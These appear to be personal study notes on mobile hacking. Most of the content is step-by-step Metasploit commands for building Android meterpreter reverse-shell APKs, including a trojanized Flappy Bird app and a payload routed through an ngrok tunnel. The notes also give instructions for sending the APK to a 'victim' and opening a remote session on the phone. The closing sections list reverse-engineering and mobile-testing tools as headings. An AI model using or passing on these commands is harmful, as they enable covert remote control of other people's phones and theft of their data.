# Mobile hacking

### Gaining Access with Android meterpreter

- msfvenom -p android/meterpreter/reverse_tcp LHOST=(KALI IP) LPORT
  =5555 -o shell.apk
- sudo service apache2 start
- mv shell.apk /var/www/html
- msfconsole
- use exploit/multi/handler
- set payload android/meterpreter/reverse_tcp
- set LHOST (IP)
- set LPORT 5555
- run

### Evil Droid

- download evil droid github
- chmod +x evil-droid
- sudo ./evil-droid

### Flappy Bird Malware

- fsvenom -x flappy-bird.apk -p android/meterpreter/reverse_tcp LHOST=(KALIIP) LPORT=5555 -o test.apk
  (-sudo apt-get remove apktool
- go to apktool official website
- nano apktool (paste there)
- follow the page's instructions)

### Hack any device on any network with ngrok

- google ngrok

### mobile backdoors

- very hard to install backdoor in ios
- payload -> msfvenom -> msfvenom -p android/meterpreter/reverse_tcp LHOST=(kali ip) LPORT=4444
- tunnel service
- ngrok -> to connect local ip to the internet
- register to ngrok
- setup for linux

- apk process
- ./ngrok tcp 4242
- copy forwarding link
- msfvenom -p android/meterpreter/reverse_tcp LHOST=(0.tcp.ngrok.io) LPORT=4444
- R > /root/ngroktest.apk
- listening for connection
- service postgressql start
- msfconsole
- use exploit/multi/handler
- set payload android/meterpreter/reverse_tcp
- show options
- set LHOST 0.0.0.0
- set LPORT 4242
- show options
- exploit -j -z
- use files.com to send the apk to victim (target user)

- signing process
- follow command

- hacking phone
- install the app
- a session will open -> hit enter
- sessions -1
- sysinfo
- help

### android app development (java/kotlin)

### ios app development (objective c/swift)

### rooting and jailbreaking

### reverse engineering - android

- apktool and jadx
- apt-get install apktool
- apt-get install jadx

### creating apk

- use android studio

### dalvik bytecode

- apktool (apk path)

### app manipulation

- read dalvik cheatsheet to modify
- rebuild the apk
- apktool --help
- apktool b (path) -o apkname.apk

### jadx usage

- jadx -d appdebug (app-debug.apk)
- get the exact java file

### proguard

- used to protect app's code
- to decompile proguarded app
- jadx -d (file) (apk) --deobf

### reverse engineering ios

- jailbreak, assembly, hexadecimal, cycript
- jailbreak detection

### cloud hacking firebase

- apktool
- network sniffing (charles proxy)

### in network attacks

- mitm, usb wifi card, bettercap, arp attack, http attack

### mobile security framework

- MobSF

### mobile api security

- Drozer
- Needle

### api pentesting
